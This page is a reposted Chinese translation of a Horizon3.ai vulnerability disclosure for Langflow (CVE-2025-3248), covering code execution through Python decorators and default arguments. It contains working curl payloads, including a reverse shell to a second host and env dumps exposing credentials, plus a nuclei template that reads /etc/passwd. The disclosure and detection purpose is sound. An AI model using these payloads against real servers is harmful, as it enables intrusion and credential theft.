<!DOCTYPE html><html lang=zh><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=renderer content=webkit><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>18K软件 AI工具 免费资源</title><link rel=stylesheet href=/css/style.css><link rel=stylesheet href=/libs/highlight/styles/18k.css><meta name=generator content="Hexo 7.3.0"></head><body id=bodyx><div class="hd posts"><a href=javascript:history.back() class=replay-btn>返回</a><div class=post-title><p>速度隐患：滥用 Python Exec 在 Langflow AI 中实现未经身份验证的远程代码执行</p><hr></div><div class=post-content><h1 id=速度隐患：滥用-Python-Exec-在-Langflow-AI-中实现未经身份验证的远程代码执行><a href=#速度隐患：滥用-Python-Exec-在-Langflow-AI-中实现未经身份验证的远程代码执行 class=headerlink title="速度隐患：滥用 Python Exec 在 Langflow AI 中实现未经身份验证的远程代码执行"></a>速度隐患：滥用 Python Exec 在 Langflow AI 中实现未经身份验证的远程代码执行</h1><p>Naveen Sunkavally  |  2025年4月9日  |  <a target=_blank rel=noopener href=https://horizon3.ai/category/attack-research/attack-blogs/ >攻击博客</a>, <a target=_blank rel=noopener href=https://horizon3.ai/category/attack-research/disclosures/ >披露</a></p><h2 id=TL-DR><a href=#TL-DR class=headerlink title=TL;DR></a>TL;DR</h2><p>我们在<a target=_blank rel=noopener href=https://www.langflow.org/ >Langflow</a>中发现了一个有趣的代码注入漏洞，<a target=_blank rel=noopener href="https://www.cve.org/CVERecord?id=CVE-2025-3248">CVE-2025-3248</a>，Langflow 是一个用于构建代理式 AI 工作流的流行工具。该漏洞易于利用，并使未经身份验证的远程攻击者能够完全攻陷 Langflow 服务器。<strong>此问题已在 Langflow 1.3.0 中修复，我们鼓励所有用户升级到最新版本。</strong></p><p><em>注意</em>：<em>由于此漏洞的利用代码已被公开，我们选择现在发布全部细节。</em></p><h2 id=背景><a href=#背景 class=headerlink title=背景></a>背景</h2><p>“代理式 AI”如今无处不在，一个充满活力的 AI 工具生态系统也随之兴起。其中一个比较流行的工具是 <a target=_blank rel=noopener href=https://github.com/langflow-ai/langflow>Langflow</a>，这是一个拥有超过 5 万 GitHub 星标的开源项目，由 DataStax 和 IBM 支持。</p><p>Langflow 是一个基于 Python 的 Web 应用程序，提供了一个可视化界面来构建 AI 驱动的代理和工作流。</p><p><img src=http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-03-at-6.30.32%E2%80%AFPM-1024x582.png alt="Langflow 可视化界面"></p><p>过去曾有几个针对 Langflow 的严重安全漏洞报告（<a target=_blank rel=noopener href="https://www.cve.org/CVERecord?id=CVE-2024-7297">CVE-2024-7297</a>、<a target=_blank rel=noopener href=https://nvd.nist.gov/vuln/detail/CVE-2024-48061>CVE-2024-48061</a>、<a target=_blank rel=noopener href=https://nvd.nist.gov/vuln/detail/CVE-2024-42835>CVE-2024-42835</a>、<a target=_blank rel=noopener href=https://nvd.nist.gov/vuln/detail/CVE-2024-37014>CVE-2024-37014</a>），但这些 CVE 看起来都存在问题。Langflow 为任何经过身份验证的用户提供了“远程代码执行即功能”，因为它允许用户修改和执行其可视化组件背后的 Python 代码。它在设计上也不支持代码执行的沙箱。这些 CVE 似乎假设 Langflow 配置为无需身份验证，或者攻击者已经拥有凭据。</p><p>我们想看看，如果 Langflow 配置了身份验证（大多数暴露在互联网上的实例都是如此），作为一个未经身份验证的攻击者，能够做到什么。</p><h2 id=糟糕的代码味道><a href=#糟糕的代码味道 class=headerlink title=糟糕的代码味道></a>糟糕的代码味道</h2><p>在查看源代码的几分钟内，我们发现了一些可疑之处——一个<a target=_blank rel=noopener href=https://github.com/langflow-ai/langflow/blob/1.2.0/src/backend/base/langflow/api/v1/validate.py>未经身份验证的 API 端点</a> <code>/api/v1/validate/code</code>，它对不受信任的用户输入执行 Python 的 <code>exec</code> 函数。</p><p><a target=_blank rel=noopener href=https://github.com/langflow-ai/langflow/blob/1.2.0/src/backend/base/langflow/utils/validate.py>https://github.com/langflow-ai/langflow/blob/1.2.0/src/backend/base/langflow/utils/validate.py</a></p><p><img src=http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-03-at-6.52.30%E2%80%AFPM-970x1024.png></p><p>但是，如何才能真正利用这个漏洞呢？这并不是直接对用户输入执行 <code>exec</code>。</p><p>该代码使用 <code>ast</code> 模块解析用户输入，并提取任何 <code>ast.Import</code> 和 <code>ast.FunctionDef</code> 节点，即任何 Python 的 <code>import</code> 语句和函数定义。</p><p>Imports 使用 <code>importlib.import_module</code> 进行验证。除非攻击者能先将一个任意的 Python 文件上传到文件系统中 Python 的模块搜索路径内，否则无法直接利用这一点。我们没有找到方法来实现这一点。</p><p>函数定义使用 <code>compile</code> 和 <code>exec</code>进行验证。然而，函数定义与函数调用不同。执行一个函数定义只会在当前的 Python 命名空间中使该函数可用；它并不会实际执行函数内的代码。我们尝试通过覆盖现有的全局和局部函数名来污染当前命名空间，但没有成功。需要更深入地挖掘……</p><h2 id=深入了解-Python-装饰器><a href=#深入了解-Python-装饰器 class=headerlink title="深入了解 Python 装饰器"></a>深入了解 Python 装饰器</h2><p><code>ast.FunctionDef</code> 究竟是什么？在 Python 中，函数定义也包括附加在函数上的装饰器。</p><p><img src=http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-04-at-10.11.49%E2%80%AFAM-1024x368.png></p><p>如果你使用 Python 足够久，你可能对装饰器很熟悉。装饰器是返回函数的函数，这些返回的函数包装了其他函数。在 Python Web 应用中，它们通常用于实现身份验证&#x2F;授权控制，例如 <code>@login_required</code>。这里有一个<a target=_blank rel=noopener href=https://www.geeksforgeeks.org/decorators-in-python/ >简单的例子</a>：</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext"># 一个简单的装饰器函数<br>def decorator(func):<br>    def wrapper():<br>        print(&quot;在调用函数之前。&quot;)<br>        func()<br>        print(&quot;在调用函数之后。&quot;)<br>    return wrapper<br><br># 将装饰器应用于一个函数<br>@decorator<br>def greet():<br>    print(&quot;你好，世界！&quot;)<br><br>greet()<br></code></pre></td></tr></table></figure><p>这里调用 <code>greet</code> 相当于调用 <code>decorator</code> 返回的 <code>wrapper</code> 函数，并产生以下输出：</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">在调用函数之前。<br>你好，世界！<br>在调用函数之后。<br></code></pre></td></tr></table></figure><p>但装饰器不必是函数或返回函数。装饰器实际上被建模为<em>表达式</em>——任意的 Python 代码语句。</p><p>假设你有一个名为 <code>foomodule.py</code> 的文件，包含以下代码：</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">@__import__(&quot;os&quot;).system(&quot;echo Inside foo decorator&quot;)<br>def foo():<br>    print(&quot;Inside foo function&quot;)<br><br></code></pre></td></tr></table></figure><p>在同一目录下，另一个文件 <code>main.py</code> 只有下面这一行：</p><p><code>import foomodule</code></p><p>然后你运行 <code>python main.py</code>：</p><p><img src=http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-04-at-5.47.13%E2%80%AFPM-1024x254.png></p><p>在 <code>main.py</code> 中导入 <code>foomodule</code> 会执行 <code>foo</code> 的函数定义，这会执行装饰器，进而运行 <code>os.system(&quot;echo Inside foo decorator&quot;)</code>，导致输出 <code>Inside foo decorator</code>。正如预期的那样，<code>foo</code> 函数本身从未被调用。</p><h3 id=滥用装饰器实现远程代码执行><a href=#滥用装饰器实现远程代码执行 class=headerlink title=滥用装饰器实现远程代码执行></a>滥用装饰器实现远程代码执行</h3><p>现在，远程代码执行变得很容易——只需将 payload 放入装饰器中。这是一个获取 Python 反向 shell 的例子，目标是一个位于 10.0.220.200 的易受攻击的主机。</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">curl -X POST -H &#x27;Content-Type: application/json&#x27; http://10.0.220.200:8000/api/v1/validate/code -d &#x27;&#123;&quot;code&quot;: &quot;@exec(\&quot;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\&quot;10.0.220.201\\\&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\&quot;/bin/sh\\\&quot;)\&quot;)\ndef foo():\n  pass&quot;&#125;&#x27;<br><br></code></pre></td></tr></table></figure><p><img src=http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-05-at-12.00.21%E2%80%AFAM-1024x457.png></p><h4 id=交互式远程代码执行><a href=#交互式远程代码执行 class=headerlink title=交互式远程代码执行></a>交互式远程代码执行</h4><p>通过从装饰器中引发一个异常，可以实现交互式 RCE。例如，以下命令将执行 <code>env</code> 命令并返回 Langflow 超级用户的用户名和密码，前提是 Langflow 已设置了身份验证：</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">curl -X POST -H &#x27;Content-Type: application/json&#x27; http://10.0.220.200:8000/api/v1/validate/code -d &#x27;&#123;&quot;code&quot;: &quot;@exec(\&quot;raise Exception(__import__(\\\&quot;subprocess\\\&quot;).check_output(\\\&quot;env\\\&quot;))\&quot;)\ndef foo():\n  pass&quot;&#125;&#x27;<br></code></pre></td></tr></table></figure><p><img src=http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-09-at-11.46.49%E2%80%AFAM-1024x274.png></p><h2 id=另一条通往-RCE-的路径：Python-默认参数><a href=#另一条通往-RCE-的路径：Python-默认参数 class=headerlink title="另一条通往 RCE 的路径：Python 默认参数"></a>另一条通往 RCE 的路径：Python 默认参数</h2><p>CVE 发布后，<a target=_blank rel=noopener href=https://x.com/_r00tuser/status/1909858365234463122>另一位研究人员发布了一个 POC</a>，该 POC 滥用了 Python 函数的另一个特性：默认参数。这些在 Python 中也被建模为表达式，并在函数定义时执行。</p><p><img src=http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-09-at-11.54.45%E2%80%AFAM-1024x726.png></p><p>因此，你同样可以将 payload 放入函数的默认参数中：</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">curl -H &#x27;Content-Type: application/json&#x27; http://10.0.220.200:8000/api/v1/validate/code -d &#x27;&#123;&quot;code&quot;:&quot;def foo(cmd=exec(\&quot;raise Exception(__import__(\\\&quot;subprocess\\\&quot;).check_output(\\\&quot;env\\\&quot;))\&quot;)):\n  pass&quot;&#125;&#x27;<br></code></pre></td></tr></table></figure><p><img src=http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-09-at-12.06.39%E2%80%AFPM-1024x216.png></p><h2 id=检测><a href=#检测 class=headerlink title=检测></a>检测</h2><p>这是一个 nuclei 模板，它使用交互式 RCE 来抓取易受攻击的 Langflow 服务器上的 <code>/etc/passwd</code> 文件：</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">id: CVE-2025-3248<br>info:<br>  name: Langflow RCE<br>  author: nvn1729<br>  severity: critical<br>  description: This template exploits an unauth RCE in Langflow<br>  tags: python,injection,vulnerability,cve<br><br>requests:<br>  - raw:<br>      - |<br>        POST /api/v1/validate/code HTTP/1.1<br>        Host: &#123;&#123;Hostname&#125;&#125;<br>        Content-Type: application/json<br>      <br>        &#123;&quot;code&quot;: &quot;@exec(&#x27;raise Exception(__import__(\&quot;subprocess\&quot;).check_output([\&quot;cat\&quot;, \&quot;/etc/passwd\&quot;]))&#x27;)\ndef foo():\n  pass&quot;&#125;<br><br>    matchers-condition: and<br>    matchers:<br>      - type: regex<br>        part: body<br>        regex:<br>          - &quot;root:.*:0:0:&quot;<br><br>      - type: status<br>        status:<br>          - 200<br></code></pre></td></tr></table></figure><h2 id=修复><a href=#修复 class=headerlink title=修复></a>修复</h2><p>我们敦促所有 Langflow 用户升级到至少 1.3.0 版本或限制对其的网络访问。截至本文撰写时，<a target=_blank rel=noopener href="https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=25&virtual_hosts=EXCLUDE&q=services.http.response.body:langflow">根据 Censys 的数据</a>，互联网上暴露了 500 多个 Langflow 实例。</p><p>该漏洞代码存在于可追溯至两年前的 Langflow 最早版本中，根据我们的测试，似乎 1.3.0 之前的大多数（如果不是全部）版本都可被利用。补丁将易受攻击的端点置于身份验证之后。从技术上讲，这个漏洞仍然可以被用来将权限从普通用户提升到 Langflow 超级用户，但即使没有这个漏洞，这也是可能实现的。我们不太清楚为什么 Langflow 在所有普通用户都可以通过设计在服务器上执行代码的情况下，还要区分超级用户和普通用户。</p><p>作为一般性建议，我们建议在将任何最近开发的 AI 工具暴露于互联网时要谨慎。如果必须将其对外暴露，请考虑将其置于隔离的 VPC 中和&#x2F;或置于 SSO 之后。只需一次错误的&#x2F;影子 IT 部署这些工具在某个云实例上，就可能导致你的系统被攻破。</p><h2 id=时间线><a href=#时间线 class=headerlink title=时间线></a>时间线</h2><ul><li><strong>2025年2月22日</strong>：Horizon3.ai 通过 GitHub 安全问题向 Langflow 报告问题</li><li><strong>2025年2月24日</strong>：Horizon3.ai 提出常规 GitHub 问题，请求维护者查看 GitHub 安全问题</li><li><strong>2025年2月25日</strong>：Horizon3.ai 通过 HackerOne 向 DataStax 提出问题作为备用方案</li><li><strong>2025年2月26日</strong>：Horizon3.ai 通过邮件向 DataStax 提出问题。DataStax 确认并表示将在 GitHub 安全问题上提供更新。</li><li><strong>2025年2月28日</strong>：Horizon3 的 NodeZero 产品增加对此漏洞的利用支持</li><li><strong>2025年3月3日</strong>：由于 GitHub 安全问题没有更新，Horizon3.ai 再次跟进 DataStax</li><li><strong>2025年3月4日</strong>：创建<a target=_blank rel=noopener href=https://github.com/langflow-ai/langflow/pull/6911>拉取请求</a>以修复问题</li><li><strong>2025年3月5日</strong>：PR 合并</li><li><strong>2025年3月10日</strong>：Horizon3.ai 向 MITRE 请求 CVE</li><li><strong>2025年3月17日</strong>：HackerOne 分类问题（此时已修复）</li><li><strong>2025年3月31日</strong>：<a target=_blank rel=noopener href=https://github.com/langflow-ai/langflow/releases/tag/1.3.0>Langflow 1.3.0</a> 发布</li><li><strong>2025年4月1日</strong>：Horizon3.ai 就 CVE 问题跟进 MITRE</li><li><strong>2025年4月2日</strong>：Horizon3.ai 向 VulnCheck 请求 CVE</li><li><strong>2025年4月3日</strong>：VulnCheck 分配 <a target=_blank rel=noopener href="https://www.cve.org/CVERecord?id=CVE-2025-3248">CVE-2025-3248</a></li><li><strong>2025年4月7日</strong>：CVE-2025-3248 发布，Horizon3.ai 请求 MITRE 取消原始 CVE 请求</li><li><strong>2025年4月9日</strong>：第三方发布利用代码</li><li><strong>2025年4月9日</strong>：本文章</li></ul><p>特别感谢 VulnCheck 在分配 CVE 方面的及时响应。</p><p>像往常一样，对于任何零日漏洞，Horizon3 的 NodeZero 产品在向供应商报告后不久便覆盖了此漏洞。</p><p>要了解 NodeZero 平台如何帮助您发现并修复环境中像这样的严重漏洞，请访问我们的 <a target=_blank rel=noopener href=https://horizon3.ai/nodezero/ >NodeZero 平台</a>页面或通过<a target=_blank rel=noopener href=https://horizon3.ai/contact-us/schedule-demo/ >请求演示</a>与专家交流。</p><h2 id=参考资料><a href=#参考资料 class=headerlink title=参考资料></a>参考资料</h2><ul><li><a target=_blank rel=noopener href=https://github.com/langflow-ai/langflow/releases/tag/1.3.0>https://github.com/langflow-ai/langflow/releases/tag/1.3.0</a></li><li><a target=_blank rel=noopener href=https://github.com/langflow-ai/langflow/pull/6911>https://github.com/langflow-ai/langflow/pull/6911</a></li><li><a target=_blank rel=noopener href="https://www.cve.org/cverecord?id=CVE-2025-3248">https://www.cve.org/cverecord?id=CVE-2025-3248</a></li></ul></div></div><div class=footer id=footer><p>Copyright © 2025 <a class=flink target=_blank rel=noopener href=http://www.18k.icu>www.18k.icu</a> <label class="el-switch el-switch-green el-switch-sm" style=vertical-align:sub><input type=checkbox name=switch id=update_style> <span class=el-switch-style></span></label></p></div><input type=hidden id=web_style value=black> <input type=hidden id=valine_appid value=CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz> <input type=hidden id=valine_appKey value=FqiyUqbg7McKN2eG0MCewupf><script src=https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js></script><script src=/libs/highlight/highlight.pack.js></script><script src=/js/js.js></script><style>.v *{color:#698fca}.v .vlist .vcard .vhead .vsys{color:#3a3e4a}.v .vlist .vcard .vh .vmeta .vat{color:#638fd5}.v .vlist .vcard .vhead .vnick{color:#6ba1ff}.v a{color:#8696b1}.v .vlist .vcard .vhead .vnick:hover{color:#669bfc}</style><script>var _hmt=_hmt||[];(()=>{var e=document.createElement("script"),t=(e.src="https://hm.baidu.com/hm.js?eb7eb8199824646269cd262b46a87950",document.getElementsByTagName("script")[0]);t.parentNode.insertBefore(e,t)})()</script></body></html>